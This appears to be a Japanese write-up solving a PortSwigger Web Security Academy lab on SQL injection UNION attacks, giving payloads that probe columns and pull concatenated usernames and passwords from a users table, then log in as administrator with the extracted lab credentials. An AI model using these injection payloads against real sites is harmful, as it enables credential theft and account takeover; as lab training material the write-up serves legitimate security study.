
# 🔥 ラボ: SQL インジェクション UNION 攻撃（単一列で複数値を取得）

PortSwigger Web Security Academy – Practitioner

---

## 🎯 **ラボの目的**

- 商品カテゴリフィルターに SQL インジェクションがある  
- UNION を使って **users テーブルの username / password を取得**  
- 取得した情報で **administrator としてログイン**  
- → ラボクリア

---

## 🧩 **脆弱性の場所**

商品カテゴリフィルター  
例：  
```
/filter?category=Gifts
```

ここに `'` や `UNION SELECT` を入れると SQL が壊れず実行される。

---

# 🚀 攻略手順

---

## **① カラム数と文字列型カラムの確認**

ラボ説明より、  
**2カラムで、2つ目だけが文字列型**。

確認用ペイロード：

```sql
'+UNION+SELECT+NULL,'abc'--
```

- エラーなし  
- `abc` が画面に出る  
→ **2カラム目が文字列型**

---

## **② users テーブルの内容を取得**

このラボは **単一列に複数値をまとめて表示する必要がある**。

### PostgreSQL / Oracle の場合
```sql
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

### MySQL の場合
```sql
'+UNION+SELECT+NULL,CONCAT(username,'~',password)+FROM+users--
```

---

## **③ 画面に出るデータ例**

```html
<th>administrator~tdzr02ambefqabahq03c</th>
```

取得できたクレデンシャル：

- **Username:** administrator  
- **Password:** tdzr02ambefqabahq03c  

他のユーザーも見える：

- carlos~6f3opqwf680i2acf5o9l  
- wiener~hq581yp95efkl51ssy0p  

---

## **④ ログイン**

右上の **My account** → ログインフォームへ

```
Username: administrator
Password: tdzr02ambefqabahq03c
```

→ **ログイン成功 → ラボ Solved**

---

